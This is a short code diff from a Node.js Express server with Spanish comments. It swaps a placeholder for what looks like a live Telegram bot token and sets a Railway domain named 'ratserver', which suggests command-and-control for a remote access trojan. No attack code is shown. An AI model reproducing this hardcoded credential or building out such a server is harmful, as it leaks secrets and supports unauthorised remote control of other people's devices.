@@ -13,7 +13,7 @@ const express = require('express'),
 // ==================================================================
 
 // 1. PEGA TU TOKEN DE TELEGRAM AQUÍ
-const MANUAL_TOKEN = "PEGAR_TU_TOKEN_AQUI"; 
+const MANUAL_TOKEN = "8379870959:AAG35f93yFwWw5Qh-O-8M1fHNxMxAPPQ7J8"; 
 
 // 2. PEGA TU DOMINIO DE RAILWAY AQUÍ (Sin barra al final)
 const MANUAL_DOMAIN = "https://ratserver-production-96a6.up.railway.app"; 
